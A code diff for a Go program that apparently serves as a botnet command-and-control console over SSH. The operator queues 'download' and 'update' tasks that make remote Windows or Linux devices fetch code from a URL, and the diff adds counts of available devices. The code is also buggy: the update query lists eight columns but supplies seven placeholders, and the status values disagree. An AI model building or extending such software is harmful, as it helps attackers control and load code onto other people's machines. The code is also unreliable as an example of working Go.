@@ -10,14 +10,17 @@ import (
 	"golang.org/x/exp/rand"
 )
 
-const letterBytes = "abcdefghijklmnopqrstuvwxyz0123456789"
+func randomString(length int) string {
+	const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
 
-func randomString(n int) string {
-	b := make([]byte, n)
-	for i := range b {
-		b[i] = letterBytes[rand.Int63()%int64(len(letterBytes))]
+	rand.Seed(uint64(time.Now().UnixNano()))
+
+	result := make([]byte, length)
+	for i := range result {
+		result[i] = charset[rand.Intn(len(charset))]
 	}
-	return string(b)
+
+	return string(result)
 }
 
 func download(channel ssh.Channel) {
@@ -43,7 +46,13 @@ func download(channel ssh.Channel) {
 		log.Fatal(err)
 	}
 	fmt.Fprintln(channel, "Chosen executions: ", executions)
-	fmt.Fprintln(channel, "Please enter your chosen OS for execution: 'windows' or 'other', if they do not match the task will not go through")
+	win, linux, _, err := GetDeviceCounts(db)
+	if err != nil {
+		fmt.Println(err)
+	}
+	fmt.Fprintf(channel, "Devices Available: Windows:%s  Linux: %s", win, linux)
+
+	fmt.Fprintln(channel, "Please enter your chosen OS for execution: 'win' or 'linux', if they do not match the task will not go through")
 	fmt.Fprint(channel, "-> ")
 	filter, err := getUserInput(channel)
 	if err != nil {
@@ -52,7 +61,7 @@ func download(channel ssh.Channel) {
 	fmt.Fprintln(channel, "Chosen filter: ", filter)
 	fmt.Fprintln(channel, "Command: download", " Executions: ", executions, " Filters: ", filter)
 	converted, _ := strconv.Atoi(executions)
-	_, err = db.Exec("INSERT INTO tasks(taskid, command, url, executions_h, executions_n, filters) VALUES(?,?,?,?,?,?)", "download-"+randomString(5), "download", url, 0, converted, filter)
+	_, err = db.Exec("INSERT INTO tasks(taskid, command, url, executions_h, executions_n, filters, created, status) VALUES(?,?,?,?,?,?,?,?)", "download-"+randomString(5), "download", url, 0, converted, filter, time.Now().Unix(), "active")
 	if err != nil {
 		fmt.Println(err)
 	}
@@ -78,7 +87,20 @@ func update(channel ssh.Channel) {
 		return
 	}
 	fmt.Fprintln(channel, "Command: update", " URL: ", url)
-	_, err = db.Exec("INSERT INTO tasks(taskid, command, url, executions_h, executions_n, filters) VALUES(?,?,?,?,?)", "update-"+randomString(5), "update", url, 0, 0, "")
+	win, linux, _, err := GetDeviceCounts(db)
+	if err != nil {
+		fmt.Println(err)
+	}
+	fmt.Fprintf(channel, "Devices Available: Windows:%s  Linux: %s", win, linux)
+
+	fmt.Fprintln(channel, "Please enter your chosen OS for execution: 'win' or 'linux', if they do not match the task will not go through")
+	fmt.Fprint(channel, "-> ")
+	filter, err := getUserInput(channel)
+	if err != nil {
+		log.Fatal(err)
+	}
+	fmt.Fprintln(channel, "Chosen filter: ", filter)
+	_, err = db.Exec("INSERT INTO tasks(taskid, command, url, executions_h, executions_n, filters, created, status) VALUES(?,?,?,?,?,?,?)", "update-"+randomString(5), "update", url, 0, 0, filter, time.Now().Unix(), "online")
 	if err != nil {
 		fmt.Println(err)
 	}
